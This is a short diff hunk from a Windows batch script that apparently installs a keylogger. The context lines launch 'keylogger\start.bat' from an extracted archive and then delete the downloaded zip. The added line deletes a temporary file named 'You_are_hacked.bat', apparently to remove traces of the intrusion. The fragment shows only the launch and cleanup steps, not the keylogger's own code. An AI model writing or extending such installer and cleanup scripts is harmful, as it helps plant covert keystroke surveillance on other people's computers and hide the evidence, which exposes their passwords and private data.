@@ -13,5 +13,6 @@ call "%EXTRACT_DIR%\keylogger\keylogger\start.bat"
 :done
 popd
 del "%ZIP_FILE%"
+del "%TEMP%\You_are_hacked.bat"
 echo Done.
 exit
